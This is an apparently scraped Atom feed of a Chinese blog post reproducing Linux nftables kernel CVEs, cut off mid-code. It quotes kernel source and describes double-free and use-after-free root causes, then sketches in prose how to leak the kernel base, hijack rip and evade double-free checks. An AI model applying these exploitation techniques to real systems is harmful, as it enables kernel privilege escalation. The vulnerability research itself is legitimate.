<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>196082&#39;s blog</title>
  
  
  <link href="https://196082.github.io/atom.xml" rel="self"/>
  
  <link href="https://196082.github.io/"/>
  <updated>2024-09-07T06:27:52.480Z</updated>
  <id>https://196082.github.io/</id>
  
  <author>
    <name>196082</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>nftables CVE复现系列【二】</title>
    <link href="https://196082.github.io/2024/09/07/nftables-CVEs2/"/>
    <id>https://196082.github.io/2024/09/07/nftables-CVEs2/</id>
    <published>2024-09-07T06:09:30.000Z</published>
    <updated>2024-09-07T06:27:52.480Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>学二进制的第一步就是斩断情丝！</strong></p><p><img   src="/images/102805509648.png" ></p><h2 id="CVE-2024-1085"><a href="#CVE-2024-1085" class="headerlink" title="CVE-2024-1085"></a>CVE-2024-1085</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>为什么如此之多的前置知识，主要是在<a href="https://196082.github.io/2024/08/17/nftables/">nftables子系统浅分析</a>的分析并不彻底所以在遇到一个新的问题的时候还是有必要回过头去细致分析的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Generic transaction helpers</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check if this object is currently active. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nft_is_active(__net, __obj)\</span></span><br><span class="line"><span class="meta">(((__obj)-&gt;genmask &amp; nft_genmask_cur(__net)) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check if this object is active in the next generation. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nft_is_active_next(__net, __obj)\</span></span><br><span class="line"><span class="meta">(((__obj)-&gt;genmask &amp; nft_genmask_next(__net)) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This object becomes active in the next generation. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nft_activate_next(__net, __obj)\</span></span><br><span class="line"><span class="meta">(__obj)-&gt;genmask = nft_genmask_cur(__net)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This object becomes inactive in the next generation. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nft_deactivate_next(__net, __obj)\</span></span><br><span class="line"><span class="meta">        (__obj)-&gt;genmask = nft_genmask_next(__net)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* After committing the ruleset, clear the stale generation bit. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nft_clear(__net, __obj)\</span></span><br><span class="line"><span class="meta">(__obj)-&gt;genmask &amp;= ~nft_genmask_next(__net)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nft_active_genmask(__obj, __genmask)\</span></span><br><span class="line"><span class="meta">!((__obj)-&gt;genmask &amp; __genmask)</span></span><br></pre></td></tr></table></figure><p>在看源码的过程中会看到很多上述宏，其实在nftables中genmask用于标记对象的状态，主要是有两个重要的标记，分别是该对象当前任务是否可用以及该对象下一次任务是否可以用。</p><p>当一个对象被删除时通常会被调用<code>nft_deactivate_next</code>函数来设置下次任务不可用。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_setelem_catchall_deactivate</span><span class="params">(<span class="keyword">const</span> struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function">   struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">   struct nft_set_elem *elem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_elem_catchall</span> *<span class="title">catchall</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ext</span> *<span class="title">ext</span>;</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry(catchall, &amp;<span class="built_in">set</span>-&gt;catchall_list, <span class="built_in">list</span>) &#123;</span><br><span class="line">ext = nft_set_elem_ext(<span class="built_in">set</span>, catchall-&gt;elem);</span><br><span class="line"><span class="keyword">if</span> (!nft_is_active(net, ext))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">kfree(elem-&gt;priv);</span><br><span class="line">elem-&gt;priv = catchall-&gt;elem;</span><br><span class="line">nft_set_elem_change_active(net, <span class="built_in">set</span>, ext);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> -ENOENT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该漏洞发生于<code>nft_setelem_catchall_deactivate</code>函数，这里会遍历当前set中所有的catchall_list然后会通过<code>nft_is_active</code>函数判断element在当前任务是否可用，随后修改掉该element的active状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">nft_set_elem_change_active</span><span class="params">(<span class="keyword">const</span> struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct nft_set_ext *ext)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ext-&gt;genmask ^= nft_genmask_next(net);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里改变active状态所使用的函数内部实现是与<code>nft_genmask_next</code>进行异或，也就是其实修改的是其在下一次任务中的活跃状态，但是前面用于判断的是这一次任务，这也就导致可以两次del它，也就是Double Free。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_commit</span><span class="params">(struct net *net, struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>, *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> base_seq, gc_seq;</span><br><span class="line">LIST_HEAD(set_update_list);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans_elem</span> *<span class="title">te</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line">LIST_HEAD(adl);</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry_safe(trans, next, &amp;nft_net-&gt;commit_list, <span class="built_in">list</span>) &#123;</span><br><span class="line">nf_tables_commit_audit_collect(&amp;adl, trans-&gt;ctx.table,</span><br><span class="line">       trans-&gt;msg_type);</span><br><span class="line"><span class="keyword">switch</span> (trans-&gt;msg_type) &#123;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">case</span> NFT_MSG_DELSETELEM:</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_DESTROYSETELEM:</span><br><span class="line">te = (struct nft_trans_elem *)trans-&gt;data;</span><br><span class="line"></span><br><span class="line">nf_tables_setelem_notify(&amp;trans-&gt;ctx, te-&gt;<span class="built_in">set</span>,</span><br><span class="line"> te-&gt;elem_priv,</span><br><span class="line"> trans-&gt;msg_type);</span><br><span class="line">nft_setelem_remove(net, te-&gt;<span class="built_in">set</span>, te-&gt;elem_priv);</span><br><span class="line"><span class="keyword">if</span> (!nft_setelem_is_catchall(te-&gt;<span class="built_in">set</span>, te-&gt;elem_priv)) &#123;</span><br><span class="line">atomic_dec(&amp;te-&gt;<span class="built_in">set</span>-&gt;nelems);</span><br><span class="line">te-&gt;<span class="built_in">set</span>-&gt;ndeact--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (te-&gt;<span class="built_in">set</span>-&gt;ops-&gt;commit &amp;&amp;</span><br><span class="line">    list_empty(&amp;te-&gt;<span class="built_in">set</span>-&gt;pending_update)) &#123;</span><br><span class="line">list_add_tail(&amp;te-&gt;<span class="built_in">set</span>-&gt;pending_update,</span><br><span class="line">      &amp;set_update_list);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_set_commit_update(&amp;set_update_list);</span><br><span class="line"></span><br><span class="line">nft_commit_notify(net, NETLINK_CB(skb).portid);</span><br><span class="line">nf_tables_gen_notify(net, skb, NFT_MSG_NEWGEN);</span><br><span class="line">nf_tables_commit_audit_log(&amp;adl, nft_net-&gt;base_seq);</span><br><span class="line"></span><br><span class="line">nft_gc_seq_end(nft_net, gc_seq);</span><br><span class="line">nft_net-&gt;validate_state = NFT_VALIDATE_SKIP;</span><br><span class="line">nf_tables_commit_release(net);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们两次删除element的时候会两次进入如上case分支中，虽然在<code>nft_setelem_remove</code>函数中会free掉<code>set-&gt;catchall</code>但是并不影响第二次的删除，因为这里的<code>elem_priv</code>是从trans中拿出来的。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>目前已经可以实现Double Free了，所以利用方法就十分简单，通过DF我们可以控制<code>table-&gt;udata</code>指向该内存区域，然后在内存区域中放上其余堆块例如<code>expr</code>来泄漏出它的ops来获得内核基地址，随后在分配<code>set</code>来获取该内存获得内核堆地址，最后先使用<code>expr</code>占据该内存随后使用<code>table-&gt;udata</code>来修改其ops来劫持rip。</p><p>需要注意的是内核是存在Double Free的检测的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_freepointer</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object, <span class="keyword">void</span> *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> freeptr_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">freeptr_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)kasan_reset_tag((<span class="keyword">void</span> *)freeptr_addr);</span><br><span class="line">*(<span class="keyword">freeptr_t</span> *)freeptr_addr = freelist_ptr_encode(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们在两次删除element的中间可以穿插一个删除其他结构体来避免检测。</p><h2 id="CVE-2023-31248"><a href="#CVE-2023-31248" class="headerlink" title="CVE-2023-31248"></a>CVE-2023-31248</h2><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct nft_chain *<span class="title">nft_chain_lookup_byid</span><span class="params">(<span class="keyword">const</span> struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> struct nft_table *table,</span></span></span><br><span class="line"><span class="params"><span class="function">       <span class="keyword">const</span> struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(net);</span><br><span class="line">u32 id = ntohl(nla_get_be32(nla));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line"></span><br><span class="line">list_for_each_entry(trans, &amp;nft_net-&gt;commit_list, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span> =</span> trans-&gt;ctx.chain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (trans-&gt;msg_type == NFT_MSG_NEWCHAIN &amp;&amp;</span><br><span class="line">    chain-&gt;table == table &amp;&amp;</span><br><span class="line">    id == nft_trans_chain_id(trans))</span><br><span class="line"><span class="keyword">return</span> chain;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOENT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞出现在这个函数，当通过id寻找chain时是不会判断当前chain的活跃状态的，如果此时在同一个batch中，该chain已被删除这里依旧可以拿到目标chain，例如在chain2中有一个expr会goto到chain1但是chain1在当前batch中已被删除，那么chain2依旧会引用chain1，不过这里虽然会删除chain1但是其并不会被free掉，因为<code>chain1-&gt;use</code>会因为引用加一。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nf_tables_commit_release</span><span class="params">(struct net *net)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* all side effects have to be made visible.</span></span><br><span class="line"><span class="comment"> * For example, if a chain named &#x27;foo&#x27; has been deleted, a</span></span><br><span class="line"><span class="comment"> * new transaction must not find it anymore.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Memory reclaim happens asynchronously from work queue</span></span><br><span class="line"><span class="comment"> * to prevent expensive synchronize_rcu() in commit phase.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;nft_net-&gt;commit_list)) &#123;</span><br><span class="line">nf_tables_module_autoload_cleanup(net);</span><br><span class="line">mutex_unlock(&amp;nft_net-&gt;commit_mutex);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trans = list_last_entry(&amp;nft_net-&gt;commit_list,</span><br><span class="line">struct nft_trans, <span class="built_in">list</span>);</span><br><span class="line">get_net(trans-&gt;ctx.net);</span><br><span class="line">WARN_ON_ONCE(trans-&gt;put_net);</span><br><span class="line"></span><br><span class="line">trans-&gt;put_net = <span class="literal">true</span>;</span><br><span class="line">spin_lock(&amp;nf_tables_destroy_list_lock);</span><br><span class="line">list_splice_tail_init(&amp;nft_net-&gt;commit_list, &amp;nf_tables_destroy_list);</span><br><span class="line">spin_unlock(&amp;nf_tables_destroy_list_lock);</span><br><span class="line"></span><br><span class="line">nf_tables_module_autoload_cleanup(net);</span><br><span class="line">schedule_work(&amp;trans_destroy_work);</span><br><span class="line"></span><br><span class="line">mutex_unlock(&amp;nft_net-&gt;commit_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在commit最终处理release时最后其实是通过<code>schedule_work</code>新起一个线程来调用调度任务。</p><p>所以这里可以使用条件竞争来扩大漏洞影响到UAF，也就是在执行<code>trans_destroy_work</code>之前，第二个batch进入到内核中并开始运行。</p><p>第一个batch如上面出发漏洞那样做，最后会正确执行调用<code>trans_destroy_work</code>，但是最后在其中不会free掉目标chain1。</p><p>第二个batch主要做的事就是删除掉chain2中的rule，并且在chain2中错误创建一个rule，那么会因为第二次的错误创建而导致不会进入到<code>nf_tables_commit</code>中，也就不会真正的删除掉chain2中原本的rule（因为真正删除是在commit中完成的），但是会因为存在删除chain2的行为导致<code>chain1-&gt;use</code>减一，从而使其为0。</p><p>那么如果能够在进入<code>nf_tables_chain_destroy</code>函数前执行完batch2那么在真正进入该函数时chain1的use依旧变为了0但是chain1依旧被chain2的rule所引用从而实现uaf。</p><p>因为这一漏洞的利用方式和前面的cve过于类似就不再赘述。</p><h2 id="CVE-2023-3390"><a href="#CVE-2023-3390" class="headerlink" title="CVE-2023-3390"></a>CVE-2023-3390</h2><h3 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_lookup_init</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nft_expr *expr,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> tb[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_lookup</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line">u8 genmask = nft_genmask_next(ctx-&gt;net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set</span> *<span class="title">set</span>;</span></span><br><span class="line">u32 flags;</span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_LOOKUP_SET] == <span class="literal">NULL</span> ||</span><br><span class="line">    tb[NFTA_LOOKUP_SREG] == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> = nft_set_lookup_global(ctx-&gt;net, ctx-&gt;table, tb[NFTA_LOOKUP_SET],</span><br><span class="line">    tb[NFTA_LOOKUP_SET_ID], genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(<span class="built_in">set</span>))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(<span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line">err = nft_parse_register_load(tb[NFTA_LOOKUP_SREG], &amp;priv-&gt;sreg,</span><br><span class="line">      <span class="built_in">set</span>-&gt;klen);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_LOOKUP_FLAGS]) &#123;</span><br><span class="line">flags = ntohl(nla_get_be32(tb[NFTA_LOOKUP_FLAGS]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~NFT_LOOKUP_F_INV)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; NFT_LOOKUP_F_INV) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">priv-&gt;invert = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_LOOKUP_DREG] != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (priv-&gt;invert)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (!(<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">err = nft_parse_register_store(ctx, tb[NFTA_LOOKUP_DREG],</span><br><span class="line">       &amp;priv-&gt;dreg, <span class="literal">NULL</span>, <span class="built_in">set</span>-&gt;dtype,</span><br><span class="line">       <span class="built_in">set</span>-&gt;dlen);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">priv-&gt;binding.flags = <span class="built_in">set</span>-&gt;flags &amp; NFT_SET_MAP;</span><br><span class="line"></span><br><span class="line">err = nf_tables_bind_set(ctx, <span class="built_in">set</span>, &amp;priv-&gt;binding);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">priv-&gt;<span class="built_in">set</span> = <span class="built_in">set</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次接触的新的一个expr类型，这里是<code>lookup</code>类型，该类型会绑定一个set。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nf_tables_bind_set</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_set *<span class="built_in">set</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">       struct nft_set_binding *binding)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_binding</span> *<span class="title">i</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_iter</span> <span class="title">iter</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">set</span>-&gt;use == UINT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!list_empty(&amp;<span class="built_in">set</span>-&gt;bindings) &amp;&amp; nft_set_is_anonymous(<span class="built_in">set</span>))</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (binding-&gt;flags &amp; NFT_SET_MAP) &#123;</span><br><span class="line"><span class="comment">/* If the set is already bound to the same chain all</span></span><br><span class="line"><span class="comment"> * jumps are already validated for that chain.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">list_for_each_entry(i, &amp;<span class="built_in">set</span>-&gt;bindings, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (i-&gt;flags &amp; NFT_SET_MAP &amp;&amp;</span><br><span class="line">    i-&gt;chain == binding-&gt;chain)</span><br><span class="line"><span class="keyword">goto</span> bind;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">iter.genmask= nft_genmask_next(ctx-&gt;net);</span><br><span class="line">iter.skip = <span class="number">0</span>;</span><br><span class="line">iter.count= <span class="number">0</span>;</span><br><span class="line">iter.err= <span 